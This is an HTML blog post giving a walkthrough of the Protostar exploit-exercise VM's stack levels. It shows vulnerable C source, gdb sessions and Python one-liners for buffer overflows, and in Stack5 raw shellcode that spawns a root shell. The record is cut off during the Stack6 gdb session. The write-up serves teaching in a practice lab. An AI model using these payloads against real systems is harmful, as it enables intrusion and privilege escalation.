<!DOCTYPE html>
<html>

    <head>
        <title> Protostar Exploit Exercises - Stack Levels &middot; InfoSec Blog </title>

        <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="generator" content="Hugo 0.55.1" />


<script src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>


<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>


<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">


<link rel="stylesheet" href="http://mislusnys.github.io/css/nix.css">



<link rel="shortcut icon" href="/favicon.ico">



<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">




    </head>

    <body>
        <header>
<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
	<div class="container-fluid">
		<div class="navbar-header">
			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			<a class="navbar-brand" id="green-terminal" href=http://mislusnys.github.io/>ms@blog ~ $</a>
		</div>

		
		<div class="collapse navbar-collapse" id="navbar-collapse-1">
			<ul class="nav navbar-nav navbar-right">
				<li>
					<a href="http://mislusnys.github.io/">/home/ms</a>
				</li>
				
				
				<li class="dropdown">
                    
            		<a href="/post">~/posts</a>
            		
        		</li>
        		

			</ul>
		</div>
	</div>
</nav>
</header>

        <div class="container wrapper">
            <h1><a href="http://mislusnys.github.io/post/2016-05-20-protostar-exploit-exercises/">Protostar Exploit Exercises - Stack Levels</a></h1>
            <span class="post-date">Jun 19, 2016 </span>
            <div class="post-content">
                <p>The Protostar VM is the next progression step after Nebula (Exploit Exercises).</p>

<p>Protostar introduces the following in a friendly way:</p>

<ul>
<li>Network programming</li>
<li>Byte order</li>
<li>Handling sockets</li>
<li>Stack overflows</li>
<li>Format strings</li>
<li>Heap overflows</li>
</ul>

<p>The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode.</p>

<p>In this post I will detail my attempt at solving the stack levels of this VM.</p>

<h3 id="stack0">Stack0</h3>

<blockquote>
<p>This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.</p>

<p>This level is at /opt/protostar/bin/stack0</p>
</blockquote>

<h4 id="source-code">Source Code</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
  <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">int</span> modified;
  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];

  modified <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  gets(buffer);

  <span style="color:#66d9ef">if</span>(modified <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
      printf(<span style="color:#e6db74">&#34;you have changed the &#39;modified&#39; variable</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  } <span style="color:#66d9ef">else</span> {
      printf(<span style="color:#e6db74">&#34;Try again?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  }
}</code></pre></div>
<p>Here, the stack layout while inside the <code>main()</code> function would look something like the following figure:</p>

<p><img src="/images/2016/06/19/stack.png" alt="stack" /></p>

<p>The user&rsquo;s input is stored inside the allocated 64 byte buffer. If we supply any input which is more than 64 bytes, we can overwrite arbitrary values on the stack.
So if we supply 65 &ldquo;A&rdquo;&rsquo;s as input, we should be able to overwrite the <code>modified</code> variable and pass this level:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">user@protostar:/opt/protostar/bin$ python -c <span style="color:#e6db74">&#39;print &#34;A&#34;*65&#39;</span> | ./stack0
you have changed the <span style="color:#e6db74">&#39;modified&#39;</span> variable
user@protostar:/opt/protostar/bin$ </code></pre></div>
<h3 id="stack1">Stack1</h3>

<blockquote>
<p>This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.</p>

<p>This level is at /opt/protostar/bin/stack1</p>
</blockquote>

<h4 id="source-code-1">Source Code</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
  <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">int</span> modified;
  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];

  <span style="color:#66d9ef">if</span>(argc <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
      errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;please specify an argument</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  }

  modified <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
  strcpy(buffer, argv[<span style="color:#ae81ff">1</span>]);

  <span style="color:#66d9ef">if</span>(modified <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x61626364</span>) {
      printf(<span style="color:#e6db74">&#34;you have correctly got the variable to the right value</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  } <span style="color:#66d9ef">else</span> {
      printf(<span style="color:#e6db74">&#34;Try again, you got 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, modified);
  }
}</code></pre></div>
<p>To pass this level, we need to modify the <code>modified</code> variable to a specific value - <code>0x61626364</code>. This translates to ascii as the string <code>abcd</code>. However, because the values on the stack are stored in &lsquo;little endian&rsquo; format - we need to overwrite the address with <code>dcba</code>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">user@protostar:/opt/protostar/bin$ ./stack1 <span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print &#34;A&#34;*64 + &#34;dcba&#34;&#39;</span><span style="color:#66d9ef">)</span>
you have correctly got the variable to the right value
user@protostar:/opt/protostar/bin$ </code></pre></div>
<h3 id="stack2">Stack2</h3>

<blockquote>
<p>Stack2 looks at environment variables, and how they can be set.</p>

<p>This level is at /opt/protostar/bin/stack2</p>
</blockquote>

<h4 id="source-code-2">Source Code</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
  <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">int</span> modified;
  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>variable;

  variable <span style="color:#f92672">=</span> getenv(<span style="color:#e6db74">&#34;GREENIE&#34;</span>);

  <span style="color:#66d9ef">if</span>(variable <span style="color:#f92672">==</span> NULL) {
      errx(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;please set the GREENIE environment variable</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  }

  modified <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

  strcpy(buffer, variable);

  <span style="color:#66d9ef">if</span>(modified <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0d0a0d0a</span>) {
      printf(<span style="color:#e6db74">&#34;you have correctly modified the variable</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
  } <span style="color:#66d9ef">else</span> {
      printf(<span style="color:#e6db74">&#34;Try again, you got 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, modified);
  }

}</code></pre></div>
<p>This level is very similar to the previous one. Here, however, we need to set the <code>GREENIE</code> environment variable with our payload which later will be copied to the buffer.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">user@protostar:/opt/protostar/bin$ export GREENIE<span style="color:#f92672">=</span><span style="color:#e6db74">`</span>python -c <span style="color:#e6db74">&#34;print &#39;A&#39;*64+&#39;\x0a\x0d\x0a\x0d&#39;&#34;</span><span style="color:#e6db74">`</span>
user@protostar:/opt/protostar/bin$ ./stack2
you have correctly modified the variable
user@protostar:/opt/protostar/bin$ </code></pre></div>
<h3 id="stack3">Stack3</h3>

<blockquote>
<p>Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack (as a prelude to overwriting the saved EIP)</p>

<p>Hints</p>

<ul>
<li>both gdb and objdump is your friend you determining where the win() function lies in memory.</li>
</ul>

<p>This level is at /opt/protostar/bin/stack3</p>
</blockquote>

<h4 id="source-code-3">Source Code</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>()
{
  printf(<span style="color:#e6db74">&#34;code flow successfully changed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
  <span style="color:#66d9ef">volatile</span> <span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>fp)();
  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];

  fp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

  gets(buffer);

  <span style="color:#66d9ef">if</span>(fp) {
      printf(<span style="color:#e6db74">&#34;calling function pointer, jumping to 0x%08x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, fp);
      fp();
  }
}</code></pre></div>
<p>In this level we need to overwrite the <code>fp</code> pointer with the address of the <code>win()</code> function.
First, we should find the address of the <code>win</code> function and then, similarly to previous levels, we can overwrite the pointer with (little endian format) address of the &ldquo;winning&rdquo; function:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">user@protostar:/opt/protostar/bin$ objdump -t stack3 | grep win
<span style="color:#ae81ff">08048424</span> g     F .text	<span style="color:#ae81ff">00000014</span>              win
user@protostar:/opt/protostar/bin$ python -c <span style="color:#e6db74">&#34;print &#39;A&#39;*64+&#39;\x24\x84\x04\x08&#39;&#34;</span> | ./stack3
calling <span style="color:#66d9ef">function</span> pointer, jumping to 0x08048424
code flow successfully changed
user@protostar:/opt/protostar/bin$ </code></pre></div>
<h3 id="stack4">Stack4</h3>

<blockquote>
<p>Stack4 takes a look at overwriting saved EIP and standard buffer overflows.</p>

<p>This level is at /opt/protostar/bin/stack4</p>

<p>Hints</p>

<ul>
<li>A variety of introductory papers into buffer overflows may help.</li>
<li>gdb lets you do “run &lt; input”</li>
<li>EIP is not directly after the end of buffer, compiler padding can also increase the size.</li>
</ul>
</blockquote>

<h4 id="source-code-4">Source Code</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">win</span>()
{
  printf(<span style="color:#e6db74">&#34;code flow successfully changed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];

  gets(buffer);
}</code></pre></div>
<p>While normally it would be easiest to exploit a standard buffer overflow using <code>pattern_create</code> and <code>pattern_offset</code> tools from the Metasploit Framework,
this level was intended to be solved using only gdb. Let&rsquo;s do it the &ldquo;hard way&rdquo;.</p>

<p>First, we setup the payload to be the exact size of our buffer (64 bytes):</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">user@protostar:/opt/protostar/bin$ python -c <span style="color:#e6db74">&#34;print &#39;A&#39;*64&#34;</span> &gt; /tmp/payload
user@protostar:/opt/protostar/bin$ </code></pre></div>
<p>Now we can put the breakpoint just before returning from the <code>main</code> (on the <code>ret</code> instruction) and examine the stack.
Since we have fully filled the buffer, we can easily see where the buffer lies on the stack in relation to the saved return address:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">user@protostar:/opt/protostar/bin$ gdb -q stack4
Reading symbols from /opt/protostar/bin/stack4...done.
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disass main
Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> main:
0x08048408 &lt;main+0&gt;:	push   %ebp
0x08048409 &lt;main+1&gt;:	mov    %esp,%ebp
0x0804840b &lt;main+3&gt;:	and    $0xfffffff0,%esp
0x0804840e &lt;main+6&gt;:	sub    $0x50,%esp
0x08048411 &lt;main+9&gt;:	lea    0x10<span style="color:#f92672">(</span>%esp<span style="color:#f92672">)</span>,%eax
0x08048415 &lt;main+13&gt;:	mov    %eax,<span style="color:#f92672">(</span>%esp<span style="color:#f92672">)</span>
0x08048418 &lt;main+16&gt;:	call   0x804830c &lt;gets@plt&gt;
0x0804841d &lt;main+21&gt;:	leave  
0x0804841e &lt;main+22&gt;:	ret    
End of assembler dump.
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> break *main+22
Breakpoint <span style="color:#ae81ff">1</span> at 0x804841e: file stack4/stack4.c, line <span style="color:#ae81ff">16</span>.
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> run &lt; /tmp/payload
Starting program: /opt/protostar/bin/stack4 &lt; /tmp/payload

Breakpoint <span style="color:#ae81ff">1</span>, 0x0804841e in main <span style="color:#f92672">(</span>argc<span style="color:#f92672">=</span><span style="color:#ae81ff">134513672</span>, argv<span style="color:#f92672">=</span>0x1<span style="color:#f92672">)</span> at stack4/stack4.c:16
<span style="color:#ae81ff">16</span>	stack4/stack4.c: No such file or directory.
	in stack4/stack4.c
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/16x $esp
0xbffff75c:	0xb7eadc76	0x00000001	0xbffff804	0xbffff80c
0xbffff76c:	0xb7fe1848	0xbffff7c0	0xffffffff	0xb7ffeff4
0xbffff77c:	0x0804824b	0x00000001	0xbffff7c0	0xb7ff0626
0xbffff78c:	0xb7fffab0	0xb7fe1b28	0xb7fd7ff4	0x00000000
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/16x $esp-32
0xbffff73c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff74c:	0x41414141	0x08048400	0x00000000	0xbffff7d8
0xbffff75c:	0xb7eadc76	0x00000001	0xbffff804	0xbffff80c
0xbffff76c:	0xb7fe1848	0xbffff7c0	0xffffffff	0xb7ffeff4
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> </code></pre></div>
<p>We can see that between the end of the buffer (the last <code>0x41414141</code> value) and the saved return address
(which is now at <code>$esp</code> and is <code>0xb7eadc76</code> in little endian) we have
exactly 3 DWORD (4 bytes) values. So now we can construct our payload as 64+3*4=76 bytes of &ldquo;A&rdquo;&rsquo;s + the address of <code>win</code> function in little endian format:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">user@protostar:/opt/protostar/bin$ objdump -t stack4 | grep win
080483f4 g     F .text	<span style="color:#ae81ff">00000014</span>              win
user@protostar:/opt/protostar/bin$ python -c <span style="color:#e6db74">&#34;print &#39;A&#39;*76+&#39;\xf4\x83\x04\x08&#39;&#34;</span> | ./stack4
code flow successfully changed
Segmentation fault
user@protostar:/opt/protostar/bin$ </code></pre></div>
<h3 id="stack5">Stack5</h3>

<blockquote>
<p>Stack5 is a standard buffer overflow, this time introducing shellcode.</p>

<p>This level is at /opt/protostar/bin/stack5</p>

<p>Hints</p>

<ul>
<li>At this point in time, it might be easier to use someone elses shellcode</li>
<li>If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger</li>
<li>remove the int3s once your shellcode is done.</li>
</ul>
</blockquote>

<h4 id="source-code-5">Source Code</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];

  gets(buffer);
}</code></pre></div>
<p>This level is the same as the previous one with the added difficulty of executing custom shellcode.
First we check that we still control the EIP reliably:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">user@protostar:~$ python -c <span style="color:#e6db74">&#34;print &#39;A&#39;*76+&#39;BBBB&#39;+&#39;C&#39;*300&#34;</span> &gt; /tmp/payload
user@protostar:~$ gdb -q /opt/protostar/bin/stack5
Reading symbols from /opt/protostar/bin/stack5...done.
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> run &lt; /tmp/payload
Starting program: /opt/protostar/bin/stack5 &lt; /tmp/payload

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? <span style="color:#f92672">()</span>
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/80x $esp
0xbffff7c0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff7d0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff7e0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff7f0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff800:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff810:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff820:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff830:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff840:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff850:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff860:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff870:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff880:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff890:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff8a0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff8b0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff8c0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff8d0:	0x43434343	0x43434343	0x43434343	0x43434343
0xbffff8e0:	0x43434343	0x43434343	0x43434343	0x00000000
0xbffff8f0:	0x00000005	0x00000007	0x00000007	0xb7fe3000
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> </code></pre></div>
<p>As we can see we cleanly overwrite the return address with &ldquo;B&rdquo;&rsquo;s (0x42) and have plenty of space for our custom shellcode afterwards.
The &ldquo;C&rdquo;&rsquo;s start at <code>0xbffff7c0</code>,
but that&rsquo;s inside gdb. To make a reliable jump to it we can choose a further address <code>0xbffff7e0</code> and pad the shellcode with NOP&rsquo;s.
I had a little bit of trouble choosing the shellcode, because as it turns out it&rsquo;s not a straight forward task to use a simple <code>execve /bin/sh</code> shellcode inside a <code>gets()</code> overflow, due to the stdin getting closed out. But after a bit of googling I found this <a href="https://www.exploit-db.com/exploits/13357/">shellcode</a>, which
addresses this exact problem (All standard bind and reverse shells should work also).</p>

<p>So my final exploit looks like this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">user@protostar:~$ python -c <span style="color:#e6db74">&#34;print &#39;A&#39;*76+&#39;\xe0\xf7\xff\xbf&#39;+&#39;\x90&#39;*100+ &#39;\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80&#39;&#34;</span> &gt; /tmp/payload
user@protostar:~$ /opt/protostar/bin/stack5 &lt; /tmp/payload 
<span style="color:#75715e"># id</span>
uid<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span><span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span><span style="color:#ae81ff">1001</span><span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> euid<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span><span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1001<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span>
# </code></pre></div>
<h3 id="stack6">Stack6</h3>

<blockquote>
<p>Stack6 looks at what happens when you have restrictions on the return address.</p>

<p>This level can be done in a couple of ways, such as finding the duplicate of the payload (objdump -s) will help with this), or ret2libc, or even return orientated programming.</p>

<p>It is strongly suggested you experiment with multiple ways of getting your code to execute here.</p>

<p>This level is at /opt/protostar/bin/stack6</p>
</blockquote>

<h4 id="source-code-6">Source Code</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">getpath</span>()
{
  <span style="color:#66d9ef">char</span> buffer[<span style="color:#ae81ff">64</span>];
  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> ret;

  printf(<span style="color:#e6db74">&#34;input path please: &#34;</span>); fflush(stdout);

  gets(buffer);

  ret <span style="color:#f92672">=</span> __builtin_return_address(<span style="color:#ae81ff">0</span>);

  <span style="color:#66d9ef">if</span>((ret <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xbf000000</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xbf000000</span>) {
      printf(<span style="color:#e6db74">&#34;bzzzt (%p)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, ret);
      _exit(<span style="color:#ae81ff">1</span>);
  }

  printf(<span style="color:#e6db74">&#34;got path %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, buffer);
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
{
  getpath();
}</code></pre></div>
<p>This level is very similar to the previous one. However, it adds an overwritten return address check - it basically disallows to return to the payload on the stack
(addresses starting with <code>0xbf</code>). Here, the easiest solution would be to try to find if our payload is duplicated somewhere else in the process memory.</p>

<p>Firstly, the code has a new local variable (4 bytes), so in theory our ret address has shifted by 4 bytes forward.
We can test that and try to find another copy of the payload in memory:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">user@protostar:~$ python -c <span style="color:#e6db74">&#34;print &#39;A&#39;*80 + &#39;BBBB&#39; + &#39;C&#39;*300&#34;</span> &gt; /tmp/payload
user@protostar:~$ gdb -q /opt/protostar/bin/stack6
Reading symbols from /opt/protostar/bin/stack6...done.
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> run &lt; /tmp/payload
Starting program: /opt/protostar/bin/stack6 &lt; /tmp/payload
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? <span style="color:#f92672">()</span>
<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info proc mappings
process <span style="color:#ae81ff">2157</span>
cmdline <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;/opt/protostar/bin/stack6&#39;</span>
